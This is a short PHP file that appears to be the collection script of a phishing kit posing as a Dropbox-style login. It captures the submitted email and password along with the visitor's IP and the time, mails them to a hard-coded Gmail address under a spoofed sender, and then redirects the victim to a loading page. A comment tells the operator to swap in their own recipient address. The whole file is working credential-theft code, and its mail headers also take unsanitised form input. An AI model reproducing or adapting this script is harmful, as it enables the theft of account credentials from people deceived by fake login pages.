<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "-------------------------------\n";

$recipient = "pinkcross032@gmail.com";  //change mail xong thi change header Location
$subject = "Bingbox - pagegg1262016";
$headers = "From:  Unknown <newsupdate@servisdropbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: ./loading.php");

	   }


?>